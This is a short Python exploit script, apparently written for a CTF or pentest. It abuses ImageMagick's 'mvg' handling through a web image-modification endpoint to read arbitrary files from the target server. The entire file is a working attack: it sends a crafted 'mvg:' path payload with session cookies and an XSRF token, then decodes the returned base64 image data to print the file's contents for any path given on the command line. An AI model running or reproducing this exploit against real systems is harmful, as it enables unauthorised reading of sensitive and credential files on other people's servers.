#!/usr/bin/env python3

"""
author: otter ʕ •ᴥ•ʔ

This script exploits the `mvg` method implemented by ImageMagick
to request the contents of a file on the target system.
The script requires a page or API point that queries ImageMagick
"""

import requests
import base64
import sys


# setup url and headers used to send the request
url = 'http://somewebsite.com/image/modify'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json',
    'X-XSRF-TOKEN': 'SOMETOKEN',
    'Origin': 'http://somewebsite.com',
    'Referer': 'http://somewebsite/admin',
    'Cookie': 'session=somesession; token=sometoken',
}


# function to construct the payload, send the request and print the file contents
# to the screen
def send_request(file_path):
    # change the payload accordingly to the website's functionality
    data = {
        'path': f'mvg:{file_path}[20x20+20+20]',
        'effect': 'wave'
    }

    # sends the request and prints the base64-decoded contents to the terminal
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200 and response.text.startswith('data:image/jpeg;base64,'):
        base64_str = response.text.split('data:image/jpeg;base64,')[1]
        decoded_str = base64.b64decode(
            base64_str).decode('utf-8')
        print(decoded_str)
    else:
        print(response.text)


# sends a request for the file specified in the first cli argument
send_request(sys.argv[1])
